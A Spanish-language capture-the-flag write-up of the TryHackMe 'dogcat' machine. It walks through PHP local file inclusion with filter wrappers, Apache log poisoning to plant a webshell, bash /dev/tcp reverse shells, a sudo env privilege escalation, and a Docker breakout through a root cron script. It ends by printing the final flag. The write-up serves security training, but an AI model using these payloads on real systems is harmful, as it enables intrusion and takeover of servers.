# DogCat

![Pasted image 20240408132640](https://github.com/JoseVazquez101/Writteups/assets/111292579/eccb2e97-afe6-4a7e-9140-076b7922721b)

***
- Source: https://tryhackme.com/r/room/dogcat
- OS: ``Linux``
- Dificultad: ``Medium``
- IP: ``No estática``
- Temas: `LFI`, `Log Poisoning`, `Docker Breakout`, `Linux Sudoers Privesc`.
***
***
### Recon:

- Realizamos primeramente un escaneo de puertos con `nmap`, vemos que en este caso solo hay dos puertos abiertos por tcp:

~~~bash
❯ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -sV 10.10.38.169
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-08 15:22 EDT
NSE: Loaded 46 scripts for scanning.
Initiating SYN Stealth Scan at 15:22
Scanning 10.10.38.169 [65535 ports]
Discovered open port 80/tcp on 10.10.38.169
Discovered open port 22/tcp on 10.10.38.169
Completed SYN Stealth Scan at 15:22, 17.07s elapsed (65535 total ports)
Initiating Service scan at 15:22
Scanning 2 services on 10.10.38.169
Completed Service scan at 15:22, 6.42s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.38.169.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 15:22
Completed NSE at 15:22, 1.08s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 15:22
Completed NSE at 15:22, 0.96s elapsed
Nmap scan report for 10.10.38.169
Host is up, received user-set (0.20s latency).
Scanned at 2024-04-08 15:22:24 EDT for 26s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 60 Apache httpd 2.4.38 ((Debian))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.74 seconds
           Raw packets sent: 83742 (3.685MB) | Rcvd: 83150 (3.327MB)
~~~

- Con `whatweb` podemos ver que el servicio http que se ejecuta en el puerto 80 emplea PHP de versión `7.4.3`, que está relativamente actualizada:

~~~zsh
❯ whatweb http://dogcat.thm/ -v
WhatWeb report for http://dogcat.thm/
Status    : 200 OK
Title     : dogcat
IP        : 10.10.38.169
Country   : RESERVED, ZZ

Summary   : Apache[2.4.38], HTML5, HTTPServer[Debian Linux][Apache/2.4.38 (Debian)], PHP[7.4.3], X-Powered-By[PHP/7.4.3]
~~~

- Analizando directorios dentro de la página encontramos algunos que se ven interesantes:

~~~bash
❯ gobuster dir -u 'http://dogcat.thm' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 --add-slash --no-error -k
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://dogcat.thm
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Add Slash:               true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/icons/               (Status: 403) [Size: 275]
/cats/                (Status: 403) [Size: 275]
/dogs/                (Status: 403) [Size: 275]
~~~

- Bien, visitando la página, tenemos una página con dos botones:

![Pasted image 20240408133428](https://github.com/JoseVazquez101/Writteups/assets/111292579/72d9f289-907e-4583-ac54-3980febbd4c1)

***
### Explotación:

- Uno de estos nos redirige a `http://dogcat.thm/?view=dog` y otra a `http://dogcat.thm/?view=cat`.
- Si intentamos incluir una ruta aplicando Path Traversal como `../../../../etc/passwd`.
- Intenté llamar a un archivo `dog.php` pero me muestra este mensaje, por lo que sabemos que utiliza include():

~~~
Warning: include(): Failed opening 'dog' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/html/index.php on line 24
~~~

- Al parecer la máquina por detrás concatena una extensión `.php` a los archivos.
- Si tuviéramos una versión de PHP 5.x podríamos concatenar un null byte `%00` para ver su contenido.

- Podemos utilizar `wrappers` de PHP para intentar ver por ejemplo un recurso de la página.
- En mi caso, introduje lo siguiente en la URL:

~~~
http://dogcat.thm/?view=php://filter/convert.base64-encode/resource=dog
~~~

- Y me regresó una cadena en base64.
- Si la desencodeamos, podremos ver algo interesante:

~~~bash
❯ echo -n PGltZyBzcmM9ImRvZ3MvPD9waHAgZWNobyByYW5kKDEsIDEwKTsgPz4uanBnIiAvPg0K | base64 -d
<img src="dogs/<?php echo rand(1, 10); ?>.jpg" />
~~~

- Intenté mostrar algún otro archivo pero no tuve suerte.
- Se me ocurrió que por el mensaje que nos pone al introducir cualquier cosa que no sea `dog` o `cat` se comprueba si estas cadenas están en la URL, así que hice esto:

~~~
http://dogcat.thm/?view=php://filter/convert.base64-encode/resource=dog/../index
~~~

- De esta forma obtuvimos una cadena bastante larga en base64.
- Podemos revertirla y ver el contenido del index:

~~~bash
❯ cat index.php | base64 -d | sponge
~~~

- Y tenemos el index:

~~~php
<!DOCTYPE HTML>
<html>

<head>
    <title>dogcat</title>
    <link rel="stylesheet" type="text/css" href="/style.css">
</head>

<body>
    <h1>dogcat</h1>
    <i>a gallery of various dogs or cats</i>

    <div>
        <h2>What would you like to see?</h2>
        <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
        <?php
            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
	   $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
            if(isset($_GET['view'])) {
                if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
                    echo 'Here you go!';
                    include $_GET['view'] . $ext;
                } else {
                    echo 'Sorry, only dogs or cats are allowed.';
                }
            }
        ?>
    </div>
</body>

</html>
~~~

- Aquí hay un par de cosas interesantes. 
- Para empezar, tenemos una variable ``$ext`` que al parecer se encarga de concatenar la extensión `.php` a los archivos.
- Y como suponíamos, se valida que exista la cadena dog o cat. 
- Hay un fallo de seguridad terrible ya que además de pedir `view` como argumento por GET, también pide `ext` como argumento.
- Esto está muy xd pero bueno, si le concatenamos el argumento y lo dejamos vacío podremos saltarnos este paso de seguridad:

~~~
http://dogcat.thm/?view=php://filter/convert.base64-encode/resource=dog/../../../../../etc/passwd&ext=
~~~

- Y podemos revertir la data en base64:

~~~bash
❯ cat data | base64 -d | sponge
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
~~~

- Descubrí que podemos ver los logs sin necesidad de wrappers, visitando la siguiente URL:

~~~
http://dogcat.thm/?view=dog/../../../../../../var/log/apache2/access.log&ext=
~~~

- Esto me da una idea, podemos realizar un `Log Poisoning`.
- Para esto, primeramente mandaremos una función `phpinfo()` como `User-Agent` para ver si esta parte no está sanitizada:

~~~bash
❯ curl -X GET 'http://dogcat.thm/?view=dog/../../../../../../var/log/apache2/access.log&ext=' --data '<?php phpinfo(); ?>'
~~~

- Si recargamos la página apuntando hacia los logs, podremos ver que la función se llamó:

![Pasted image 20240408145708](https://github.com/JoseVazquez101/Writteups/assets/111292579/295aa14e-7cc0-4a2e-9e4e-732bb2f3a24a)

- Ahora bien, subiremos una webshell de igual forma:

~~~bash
❯ curl -X GET 'http://dogcat.thm/?view=dog/../../../../../../var/log/apache2/access.log&ext=' -H "User-Agent: <?php system(\$_GET['cmd']); ?>"
~~~

- Ya solo bastaría con ejecutar una revshell desde aquí, urlencodeando los ampersand `&` poniendo en su lugar `%26`:

~~~
http://dogcat.thm/?view=dog/../../../../../../var/log/apache2/access.log&ext=&cmd=bash -c "bash -i >%26 /dev/tcp/192.168.17.128/4444 0>%261"
~~~

- Y de esta forma poniéndonos en escucha, entablaremos una conexión:

~~~bash
❯ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.2.60.167] from (UNKNOWN) [10.10.66.28] 60966
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@2d41b5f09911:/var/www/html$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
~~~

- Hacemos un tratamiento de TTY:

~~~bash
script /dev/null -c bash
^Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
stty rows 44 columns 184
~~~

- Con algunos comandos, vemos que esta máquina es un docker:

~~~bash
www-data@2d41b5f09911:/var/www/html$ uname -a
Linux 2d41b5f09911 4.15.0-96-generic #97-Ubuntu SMP Wed Apr 1 03:25:46 UTC 2020 x86_64 GNU/Linux
www-data@2d41b5f09911:/var/www/html$ hostname -I
172.17.0.2 
~~~
***

### Root Docker:

- Vemos que podemos ejecutar como root el binario `env`:

~~~zsh
www-data@2d41b5f09911:/var/www/html$ sudo -l
Matching Defaults entries for www-data on 2d41b5f09911:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
~~~

- Podemos spawnear una shell de la siguiente forma:

~~~bash
www-data@2d41b5f09911:/var/www/html$     sudo env /bin/sh
# id
id: not found
~~~

- Al parecer el usuario root no tiene una path definida porque no funcionan algunas rutas relativas.
- Podemos exportarle una path por defecto de la siguiente manera:

~~~bash
# export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games:$PATH
# id
uid=0(root) gid=0(root) groups=0(root)
~~~
***
### Docker breakout & root:

- Utilicé linpeas y encontré algo bastante curioso:

~~~bash
╔══════════╣ Backup files (limited 100)
-rw-r--r-- 1 root root 2949120 Apr  8 22:28 /opt/backups/backup.tar
-rwxr--r-- 1 root root 69 Mar 10  2020 /opt/backups/backup.sh
~~~

- Tenemos unas backups.
- Revisando el archivo tiene toda la pinta de ser una cronjob, además lo comprobé borrando el archivo `.tar` que genera, y este volvió a aparecer:

~~~bash
root@2d41b5f09911:/opt/backups# cat backup.sh 
#!/bin/bash
tar cf /root/container/backup/backup.tar /root/container
~~~

- No tenemos editores de texto en el docker, así que podemos sobreescribir el archivo con `echo`:

~~~bash
root@2d41b5f09911:/opt/backups# echo '#!/bin/bash' > backup.sh && echo "bash -i >& /dev/tcp/10.2.60.167/4444 0>&1" >> backup.sh
root@2d41b5f09911:/opt/backups# cat backup.sh 
#!/bin/bash
bash -i >& /dev/tcp/10.2.60.167/4444 0>&1
~~~

- Solo bastaría con ponernos en escucha y ganaríamos acceso a la máquina real:

~~~bash
❯ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.2.60.167] from (UNKNOWN) [10.10.66.28] 37580
bash: cannot set terminal process group (16167): Inappropriate ioctl for device
bash: no job control in this shell
root@dogcat:~# ls
ls
container
flag4.txt
root@dogcat:~# cat flag4.txt
cat flag4.txt
THM{esc4l4tions_on_esc4l4tions_on_esc4l4tions_7a52b17dba6ebb0dc38bc1049bcba02d}
~~~

- Y así completaríamos esta máquina, una bastante fácil que sirve para repasar conceptos básicos de vulnerabilidades típicas.
